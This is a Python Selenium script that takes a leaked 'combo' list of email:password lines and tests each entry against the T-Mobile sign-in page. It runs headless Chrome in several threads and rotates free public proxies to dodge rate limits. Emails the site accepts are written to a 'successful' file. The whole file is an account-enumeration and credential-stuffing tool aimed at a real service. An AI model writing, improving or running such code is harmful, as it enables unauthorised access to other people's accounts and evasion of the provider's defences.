#if self.driver.current_url.startswith('https://www.sprint.com'):
#self.driver.get('https://account.t-mobile.com/signin/v2/')
import requests, random, time, json, threading, warnings, re, fnmatch, os, fnmatch, fileinput, inspect, cloudscraper
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys

#make this program faster with multithreading on a list of email:password combonations or just EMAIL

file = r"C:\Users\Ruthless Economy PC\Desktop\Gemini Webdriver\combo176047.txt" #change me for the directory of the email file!
org = open(file).read().splitlines()
FINISHED_LINES = []
START_THREADS = {}
PROXY_ROTATE = 0

options = webdriver.ChromeOptions()
options.add_argument("--headless")

def WEBDRIVER_THREAD():
        global PROXY_ROTATE

        for line in org:
            CURRENT_LINES = []
            GATEKEEPER = 1

            #DONE = inspect.currentframe().f_lineno #trying to find the current line my program is on the adding it to a list of emails to no longer attempt

            if line not in FINISHED_LINES or line not in CURRENT_LINES: #changed to better avoid overlapping, please learn how to use pool instead
                CURRENT_LINES.append(line)
                print("BEGIN:", line)
            
            else:
                print("ALREADY COMPLETED:", line)
                GATEKEEPER = 0

            while GATEKEEPER == 1:

                GET_PROXY = requests.get("https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all", allow_redirects=True, verify=False)
                FIX_PROXY = GET_PROXY.content.decode('utf-8')
                FIX_PROXY = str(FIX_PROXY)
                FIX_PROXY = FIX_PROXY[2:]
                FIX_PROXY = FIX_PROXY.split("\\r\\n")

                PROXY = FIX_PROXY[PROXY_ROTATE] 
                print(PROXY) #prints the entire list of proxies? should only be using one at a time!

                options.add_argument('--proxy-server=%s' % PROXY)

                browser = webdriver.Chrome(executable_path=r'C:\Users\Ruthless Economy PC\Desktop\Gemini Webdriver\chromedriver.exe', chrome_options=options)

                #EMAIL = line.split(":", 1)
                try:
                    browser.get("https://account.t-mobile.com/signin/v2/")

                except:
                    print("PROXY ERROR OR FAILURE")
                    PROXY_ROTATE = PROXY_ROTATE + 1
                    CURRENT_LINES.clear()
                    break

                time.sleep(10)
                WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.XPATH, "//*[@id='usernameTextBox']"))).send_keys(line + Keys.ENTER)
                #browser.send_keys(EMAIL[0])
                #browser.send_Keys(Keys.ENTER)

                try:
                    
                    if WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.XPATH, "//*[@id='globalHeader']/app-root/div/div[2]/div/div/div/div[2]/app-login/div[2]/div/div/div/div[1]"))):
                        print("A successful email has been found for our target site:", line)
                        browser.close()
                        FINISHED_LINES.append(line)

                        with open("SUCCESSFUL_TMOBILE_EMAILS.txt", "a", encoding="utf-8") as finish:
                            finish.write(line)
                            finish.write("\n")
                            finish.close()
                            PROXY_ROTATE = PROXY_ROTATE + 1
                            CURRENT_LINES.clear()


                except:
                        print("AN ERROR HAS OCCURED:", line)
                        PROXY_ROTATE = PROXY_ROTATE + 1
                        CURRENT_LINES.clear()
                break

OPTION_THREAD = input("Pick the amount of threads to use! I reccomend 5 to avoid rate-limiting issues and CPU usage: ")

try:
    OPTION_THREAD = int(OPTION_THREAD)
    print("\n")

except:
    print("That's not a number, Bye-bye!")
    exit()

with fileinput.input(files=(file)) as COUNT:

    PLACEHOLDER = len(org)
    PLACEHOLDER_SPLIT = int(PLACEHOLDER/OPTION_THREAD)
    print(PLACEHOLDER, "total emails!")
    print(PLACEHOLDER_SPLIT, "emails each for all", OPTION_THREAD, "webdrivers!")

    PLACEHOLDER_DRIVER_COUNT = int(OPTION_THREAD)

    while PLACEHOLDER_DRIVER_COUNT > 0:

        print("\n STARTED THREAD", PLACEHOLDER_DRIVER_COUNT, "\n")
        time.sleep(3) #stop threads from all starting on the same line!
        START_THREADS["string{0}".format(PLACEHOLDER_DRIVER_COUNT)] = threading.Thread(target = WEBDRIVER_THREAD).start()
        PLACEHOLDER_DRIVER_COUNT = PLACEHOLDER_DRIVER_COUNT - 1

    #while PLACEHOLDER_DRIVER_COUNT > 0:

        #START_THREADS["string{0}".format(PLACEHOLDER_DRIVER_COUNT)].start()
        #PLACEHOLDER_DRIVER_COUNT = PLACEHOLDER_DRIVER_COUNT - 1



    #elif WebDriverWait(browser, 10).until(browser.find_element_by_xpath(WebDriverWait(browser, 10).until(browser.find_element_by_xpath("/html/body/app-initiation/div/app-root/div/div[3]/div/div/div/div[2]/app-page-level-error-message/div/div[2]/span"))
